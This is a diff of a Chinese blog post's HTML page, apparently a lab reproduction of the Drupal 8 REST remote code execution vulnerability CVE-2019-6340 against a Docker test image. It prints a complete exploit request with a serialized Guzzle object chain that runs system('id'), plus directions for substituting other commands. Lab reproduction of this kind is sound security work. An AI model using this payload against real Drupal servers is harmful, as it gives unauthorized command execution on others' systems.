@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya15000fs04z4cazcfdf" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyfz000hys4z7dapeb7p" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -181,7 +181,34 @@
 <p>1、搜索镜像<br>     <code>docker search cve-2019-6340</code><br>2、拉取<br>     <code>docker pull knqyf263/cve-2019-6340</code><br>3、运行<br>     <code>docker run -d -t -p 80:80 knqyf263/cve-2019-6340</code><br>4、访问url:<code>http://174.99.8.203/node/1</code><br><img src="https://img-blog.csdnimg.cn/20201014151054195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>5、抓取数据包并修改<br><img src="https://img-blog.csdnimg.cn/20201014151534691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>注意三点:<br>A、POST /node/?_format=hal_json<br>B、Content-Type: application/hal+json<br>C、/rest/type/shortcut/default</p>
 <p>本次复现踩坑。<br>POST /drupal<strong>8.x</strong>/node/?_format=hal_json<br>/<strong>drupal</strong>/rest/type/shortcut/default<br>Content-Type: application/<strong>x-www-form-urlencoded</strong></p>
 <p>6、命令修改，修改s:2:&quot;id&quot;;id为执行的命令，2为命令长度。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /node/?_<span class="built_in">format</span>=hal_json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">174.99</span><span class="number">.8</span><span class="number">.203</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; ) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">83.0</span><span class="number">.4086</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Referer: http://<span class="number">174.99</span><span class="number">.8</span><span class="number">.203</span>/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/hal+json</span><br><span class="line">Content-Length: <span class="number">630</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;link&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;link&quot;</span>,</span><br><span class="line">      <span class="string">&quot;options&quot;</span>: <span class="string">&quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;a:2:&#123;i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&#123;s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;s:2:\&quot;id\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000stack\&quot;;a:1:&#123;i:0;a:1:&#123;i:0;s:6:\&quot;system\&quot;;&#125;&#125;s:31:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;&#125;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;s:9:\&quot;_fn_close\&quot;;a:2:&#123;i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_links&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;href&quot;</span>:<span class="string">&quot;http://174.99.8.203/rest/type/shortcut/default&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">POST /node/?_<span class="hljs-built_in">format</span>=hal_json HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">174.99</span><span class="hljs-number">.8</span><span class="hljs-number">.203</span>
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; ) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">83.0</span><span class="hljs-number">.4086</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span>
+Referer: http://<span class="hljs-number">174.99</span><span class="hljs-number">.8</span><span class="hljs-number">.203</span>/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span>
+Connection: close
+Content-<span class="hljs-type">Type</span>: application/hal+json
+Content-Length: <span class="hljs-number">630</span>
+
+
+&#123;
+  <span class="hljs-string">&quot;link&quot;</span>: [
+    &#123;
+      <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;link&quot;</span>,
+      <span class="hljs-string">&quot;options&quot;</span>: <span class="hljs-string">&quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;a:2:&#123;i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&#123;s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;s:2:\&quot;id\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000stack\&quot;;a:1:&#123;i:0;a:1:&#123;i:0;s:6:\&quot;system\&quot;;&#125;&#125;s:31:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;&#125;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;s:9:\&quot;_fn_close\&quot;;a:2:&#123;i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;&#125;&#125;&quot;</span>
+    &#125;
+  ],
+  <span class="hljs-string">&quot;_links&quot;</span>: &#123;
+    <span class="hljs-string">&quot;type&quot;</span>: &#123;
+      <span class="hljs-string">&quot;href&quot;</span>:<span class="hljs-string">&quot;http://174.99.8.203/rest/type/shortcut/default&quot;</span>
+    &#125;
+  &#125;
+&#125;</code></pre>
 <p>7、成功执行<br><img src="https://img-blog.csdnimg.cn/20201014155156259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 
         </div>
